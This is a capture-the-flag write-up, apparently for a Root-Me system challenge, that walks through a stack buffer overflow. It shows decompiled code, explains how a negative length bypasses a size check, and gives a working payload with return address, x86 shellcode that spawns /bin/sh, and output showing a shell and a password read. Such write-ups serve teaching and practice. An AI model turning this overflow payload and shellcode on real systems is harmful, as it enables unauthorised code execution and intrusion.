### S0lv3d by H4yicl3

First i download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code .
```c
int __cdecl read_file(int fd)
{
  char *v1; // edx@1
  unsigned int v2; // ebx@1
  int v3; // edi@5
  int v4; // edx@5
  int size; // [sp+18h] [bp-90h]@9
  char path; // [sp+1Fh] [bp-89h]@1
  int v8; // [sp+20h] [bp-88h]@2

  v1 = &path;
  v2 = 129;
  if ( (unsigned int)&path & 1 )
  {
    path = 0;
    v1 = (char *)&v8;
    v2 = 128;
  }
  if ( (unsigned __int8)v1 & 2 )
  {
    *(_WORD *)v1 = 0;
    v1 += 2;
    v2 -= 2;
  }
  memset(v1, 0, 4 * (v2 >> 2));
  v3 = (int)&v1[4 * (v2 >> 2)];
  v4 = (int)&v1[4 * (v2 >> 2)];
  if ( v2 & 2 )
  {
    *(_WORD *)v3 = 0;
    v4 = v3 + 2;
  }
  if ( v2 & 1 )
    *(_BYTE *)v4 = 0;
  if ( read(fd, &size, 4u) != 4 )     //the line code get 4 byte first of file we read to a size of file!! if <size <4 call exit(0)
  {
    puts("[-] File too short.");
    exit(0);
  }
  if ( size > 127 )			//if size >127 call exit(0)
  {
    puts("[-] Path too long.");
    exit(0);
  }
  read_data(&path, fd, size);
  if ( path != 0x2F )                  //if the path[0] != 0x2F (char "/") call exit(0)
  {
    puts("[-] Need a absolute path.");
    exit(0);
  }
  return printf("[+] The pathname is : %s\n", &path);
}
```
try to understand code you know !! 
See the source code we know !! the buffer size is 128
it is the global variable of this program
```c
#define BUFFER 128
//the function read file to buffer
void read_data(char *data, int fd, int size)
{
  while(read(fd, data, 1) == 1 && *data && size) if(size !=0 and data !=0 and read function can excute 
    {
      size--;		 //the following steps
      data++;
    }
//we can write more byte if size not =0 
//that mean we will overflow the size with negative number
}
```
try that i write the following python script look like
```python
padding ="\xff\xff\xff\xff" #-1
padding +="\x2f"*128
padding +="A"*13
retn ="\x94\xd8\xff\xff"
print padding+retn
```
the retn i make with getenv function  http://pastebin.com/LZM64WGL
and shellcode here
```
export hayicle=$(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
./getenv hayicle ./ch11
hayicle will be at 0xffffd894
```
Finally i run this script
```
./ch11 password.txt 
[+] The pathname is : ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAAAAAAAAAAAA����

$ whoami
hayicle
```

GLHF guys !!! Don't give up here !!


The script i try in sever!!
```
app-systeme-ch11@challenge02:~$ ./ch11 /tmp/ch11/input
[+] The pathname is : ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAAAAAAAAAAAA����

sh-4.2$ ls
ch11  ch11.c
sh-4.2$ cat .passwd
```
and it work !! so lucky ! <3
